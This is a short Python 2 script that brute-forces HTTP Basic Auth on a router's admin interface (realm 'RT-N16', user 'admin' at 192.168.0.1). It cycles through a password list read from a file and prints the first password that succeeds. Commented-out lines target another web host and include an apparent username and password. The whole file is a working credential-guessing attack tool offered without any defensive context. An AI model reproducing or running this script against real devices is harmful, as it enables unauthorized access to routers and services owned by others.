#!/usr/bin/env python
# coding: utf-8

import urllib2
import getpass
import sys

#user = 'maria'
user = 'admin'
#passwd = 'reportz'
uri = 'http://192.168.0.1:80'
#uri = 'http://reports.zvq.me:80'
#pass_url = 'http://reports.zvq.me/ready/'
pass_url = 'http://192.168.0.1'
#realm='Restricted'
realm='RT-N16'

def ticker(tnum=None):
		if not tnum: tnum = 0
		ticker_chars = '/-\\|'
		sys.stdout.write(ticker_chars[tnum])
		sys.stdout.flush()
		tnum +=1
		if tnum > 3: tnum = 0
		return tnum

f = open ('pass.txt')
data = f.readlines()

pass_list = [ l.split(':')[0].strip() for l in data ]
pass_list.extend([ l.split(':')[1].strip() for l in data ])
pass_list = list(set(pass_list))

count = float(len(pass_list))
step = int(count/30)
bar = 0

sbarmax = 30
sbar = '['+(' '*sbarmax)+']'

counter = 0
sys.stdout.write(sbar)
sys.stdout.flush()
num = ticker()
for i in pass_list:
		authinfo = urllib2.HTTPBasicAuthHandler()
		authinfo.add_password(
															realm=realm,
															uri=uri,
															user=user,
															passwd=i)

		opener = urllib2.build_opener(authinfo)
		urllib2.install_opener(opener)

		num = ticker(tnum=num)

		f = None
		try:
				f = urllib2.urlopen(pass_url)
		except urllib2.HTTPError, msg:
				pass
		if f: 
				print i
				sys.exit(0)
		counter +=1
		sys.stdout.write('\b')
		if counter % step == 0:
				bar += 1
				sys.stdout.write('\b'*32)
				sys.stdout.write('['+bar*'='+' '*(sbarmax-bar)+']')
				sys.stdout.flush()

		#else: print 'Error!'
